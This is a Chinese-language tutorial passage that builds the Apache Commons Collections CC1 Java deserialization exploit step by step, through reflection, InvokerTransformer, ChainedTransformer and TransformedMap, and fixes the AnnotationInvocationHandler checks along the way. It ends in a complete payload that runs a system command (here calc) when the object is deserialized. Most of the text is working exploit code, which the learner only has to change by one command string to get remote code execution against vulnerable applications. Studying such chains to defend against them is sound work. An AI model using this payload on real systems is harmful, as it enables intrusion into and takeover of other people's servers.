
```java
// 此处的Runtime 对象 r 是不能序列化的
Runtime r = Runtime.getRuntime();
InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
HashMap<Object, Object> map = new HashMap<>();
map.put("key","value");
Map<Object, Object> transforedMap = TransformedMap.decorate(map, null, invokerTransformer);
/*
for(Map.Entry entry : transforedMap.entrySet()){
entry.setValue(r);
}
*/
// 获取类
Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
// 获取构造函数
Constructor<?> annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
// 爆破
annotationInvocationHandlerConstructor.setAccessible(true);
// 获取实例
Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, transforedMap);
serialize(o); // 序列化
deserialize("ser.bin"); // 反序列化
```

从已注释的`for`循环可以看到，我们调用`setValue(r)`需要传入`r`

目前payload的几个问题：

## 问题1、`setValue()`中我们需要传入`Runtime`的对象`r`，而`AnnotationInvocationHandler`类中的`setValue()`中的参数还无法控制。

## 问题2、`Runtime`类没有继承`Serializable`接口，不能序列化/反序列化。

## 问题2解决：

`Runtime`类不能序列化，而`Class`类可以序列化

`Runtime r = Runtime.getRuntime();`不能序列化

`Class c = Runtime.class;`可以序列化

正常的反射调用

```java
// 正常的反射调用
// 获取Runtime的class对象
Class c = Runtime.class;
// 获取getRuntime方法 （函数名，参数类型）无参方法，参数类型写null
Method getRuntimeMethod = c.getMethod("getRuntime", null);
// 获取到Runtime的对象r
// 第一个参数表示在那个对象调用，getRuntime()为static方法，所以为null
// 第二个参数表示方法的参数，没有参数，所以为null
Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);
// 获取exec方法
Method execMethod = c.getMethod("exec", String.class);
// 调用exec，（对象，参数）
execMethod.invoke(r, "calc");
```

改成`InvokerTransformer(方法名， 参数类型， 参数)`

```java
/* 改写成InvokerTransformer(方法名， 参数类型， 参数)，链式调用
// 相当于
// Class c = Runtime.class;
// Method getRuntimeMethod = c.getMethod("getRuntime", null);
获取getRuntime方法，相当于在Runtime.class上调用getMethod()方法，参数为getRuntime,
参数类型为null
*/
Method getRuntimeMethod1 = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
new Object[]{"getRuntime", null}).transform(Runtime.class);
// 获取Runtime对象
Runtime r1 = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
new Object[]{null, null}).transform(getRuntimeMethod1);
new InvokerTransformer("exec", new Class[]{String.class},
new Object[]{"calc"}).transform(r1);
```

改成`ChainedTransformer`的形式

```java
//改成ChainedTransformer的形式
// 构造transformers 数组
Transformer[] transformers = new Transformer[]{
new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
new Object[]{"getRuntime", null}),
new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
new Object[]{null, null}),
new InvokerTransformer("exec", new Class[]{String.class},
new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
chainedTransformer.transform(Runtime.class); // 调试的时候要注释掉
```

上面的payload中，只有`Runtime.class`是我们可以控制的。

## payload2，解决了问题2，还不能执行成功

```java
// 此处的Runtime 对象 r 是不能序列化的，需要修改
// Runtime r = Runtime.getRuntime();
// InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
Transformer[] transformers = new Transformer[]{
new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
new Object[]{"getRuntime", null}),
new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
new Object[]{null, null}),
new InvokerTransformer("exec", new Class[]{String.class},
new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> map = new HashMap<>();
map.put("key","value");
Map<Object, Object> transforedMap = TransformedMap.decorate(map, null, chainedTransformer);
/*
for(Map.Entry entry : transforedMap.entrySet()){
entry.setValue(r);
}
*/
// 获取类
Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
// 获取构造函数
Constructor<?> annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
// 爆破
annotationInvocationHandlerConstructor.setAccessible(true);
// 获取实例
Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, transforedMap);
serialize(o); // 序列化
deserialize("ser.bin"); // 反序列化
```

## 问题3、`AnnotationInvocationHandler`类中的`readObject()`中的`for`循环中有两个`if`判断需要满足。

## 问题3解决

分析：

1、可能没进入`if`判断

2、后面的`setValue()`括号中的`new AnnotationTypeMismatchExceptionProxy()`是我们不能控制的。

第一个`if`:

调试：下断点运行，发现`Override.class`中是空的，`getKey()`得到的是`null`，进不去第一个`if`判断。

```java
public @interface Override {
}
for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
String name = memberValue.getKey();
// 因为Override里面是空实现，所以memberType为null
Class<?> memberType = memberTypes.get(name);
if (memberType != null) { // i.e. member still exists
Object value = memberValue.getValue();
if (!(memberType.isInstance(value) ||
value instanceof ExceptionProxy)) {
memberValue.setValue(
new AnnotationTypeMismatchExceptionProxy(
value.getClass() + "[" + value + "]").setMember(
annotationType.members().get(name)));
}
}
}
```

把

```java
Object o = annotationInvocationHandlerConstructor.newInstance(Override.class, transforedMap);
```

改成

```java
Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transforedMap);
```

注解`Target`中是有参数的。

```java
public @interface Target {
/**
* Returns an array of the kinds of elements an annotation type
* can be applied to.
* @return an array of the kinds of elements an annotation type
* can be applied to
*/
ElementType[] value();
}
```

第二个`if`（直接可以进入，不需要构造）：

1、`memberType`能不能强转成`value`

2、`value`是不是`ExceptionProxy`类的实例

```java
if (!(memberType.isInstance(value) || value instanceof ExceptionProxy))
```

## 问题1解决：

使用`ConstantTransformer()`。

`ConstantTransformer`：不管输入是什么，调用`transform()`方法时，都返回构造函数输入的值。

## payload3：

```java
// 此处的Runtime 对象 r 是不能序列化的，需要修改
// Runtime r = Runtime.getRuntime();
// InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class),
new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class},
new Object[]{"getRuntime", null}),
new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class},
new Object[]{null, null}),
new InvokerTransformer("exec", new Class[]{String.class},
new Object[]{"calc"})
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
HashMap<Object, Object> map = new HashMap<>();
// 第一个值要与所选注解中的参数对应，Target中的参数为value，所以第一个参数要改为value
map.put("value","value");
Map<Object, Object> transforedMap = TransformedMap.decorate(map, null, chainedTransformer);
/*
for(Map.Entry entry : transforedMap.entrySet()){
entry.setValue(r);
}
*/
// 获取类
Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
// 获取构造函数
Constructor<?> annotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class, Map.class);
// 爆破
annotationInvocationHandlerConstructor.setAccessible(true);
// 获取实例
Object o = annotationInvocationHandlerConstructor.newInstance(Target.class, transforedMap);
serialize(o); // 序列化
deserialize("ser.bin"); // 反序列化
```

## 正向调用顺序：

![图片描述](upload/attach/202212/951339\_6GGKXDYMZTR5933.png)

参考文献：

<a href="elink@ca6K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6K6N6e0p5^5i4K6u0W2L8%4u0Y4i4K6u0r3M7r3!0K6N6q4)9J5c8Y4W2K6L8%4y4W2M7X3W2S2L8q4)9J5k6s2y4#2x3e0S2Q4x3X3b7J5i4K6u0r3">Java 反序列化漏洞（二） - Commons Collections</a>
